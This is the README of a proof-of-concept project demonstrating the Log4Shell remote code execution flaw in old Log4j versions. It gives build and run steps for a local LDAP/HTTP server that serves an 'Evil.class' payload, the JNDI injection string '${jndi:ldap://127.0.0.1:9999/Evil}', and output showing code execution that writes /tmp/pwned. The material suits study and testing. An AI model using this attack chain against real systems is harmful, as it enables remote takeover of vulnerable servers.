## Log4Shell Proof of Concept

The purpose of this project is to demonstrate the Log4Shell exploit with Log4J versions older than `2.15.0`.

For more information about the exploit and the mechanics of how it works, 
[here is a good blog post](https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-4428/).

### Requirements

You'll need one of the following Java SDKs:
  * 11.0.1 or earlier
  * 8u191 or earlier
  * 7u201 or earlier
  * 6u211 or earlier

Java SDKs newer than those versions don't have the same vulnerability.

### Building the PoC

In the root folder, run:

```
./mvnw clean install
```

**NOTE:** This project includes the Maven wrapper, so you don't need to have previously installed Maven.

### Running the PoC

This repo has two modules: server and client.

The server module runs a lean LDAP & HTTP server.

The LDAP server listens on port `9999` by default and will return an `LDAPResult` that includes a URL reference to a
Java class that will be deserialized and executed.

The HTTP server listens on port `8000` and responds to any request with a byte array that is the `Evil.class`.

`Evil` implements `ObjecFactory` which the JNDI mechanism hooks into to execute its `getObjectInstance` method. While
the method simply returns `null`, it uses `Runtime` to execute arbitrary code on the host machine. In this case, it
writes to a file called: `/tmp/pwned` to prove that it _could_ execute basically anything available on the machine.

This PoC should run as-is on Linux or Mac.

Open a terminal window and run the following:

```
cd log4shell-server
../mvnw exec:java -Dexec.mainClass="Server"
```

You should see output that looks like the following:

```
[INFO] --- exec-maven-plugin:3.0.0:java (default-cli) @ log4shell-server ---
LDAP server listening on 0.0.0.0:9999
HTTP server listening on 0.0.0.0:8000
```

In another terminal window, run the following:

```
cd log4shell-client
JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_111.jdk/Contents/Home \
../mvnw exec:java -Dexec.mainClass="Main"
```

**NOTE:** Referencing `JAVA_HOME` is important as the exploit only fully works with older JDK versions.
For example, you can download JDK 8u111 
[here](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html). If you download
and install the version for Mac, the above command will work for you.

You should see output that looks like the following:

```
[INFO] --- exec-maven-plugin:3.0.0:java (default-cli) @ log4shell-client ---
---------- JVM Props -------------
java.vm.version=25.111-b14
java.vm.vendor=Oracle Corporation
java.vm.name=Java HotSpot(TM) 64-Bit Server VM
java.vm.specification.name=Java Virtual Machine Specification
java.vm.specification.vendor=Oracle Corporation
java.vm.specification.version=1.8
java.vm.info=mixed mode
---------------------------------
20:27:49.676 [Main.main()] ERROR Main - test
/tmp/pwned DOES NOT EXIST
20:27:49.679 [Main.main()] ERROR Main - Output:${jndi:ldap://127.0.0.1:9999/Evil}
/tmp/pwned EXISTS - yah been pwned!
```

**NOTE**: The client app will tell you if it was successful. It does some checks, including looking for the 
`/tmp/pwned` file before and after the attack. You MUST delete the `/tmp/pwned` file between runs in order for the
client app to work properly. The file not being there and then being present after the attack is how it knows it's
been successful.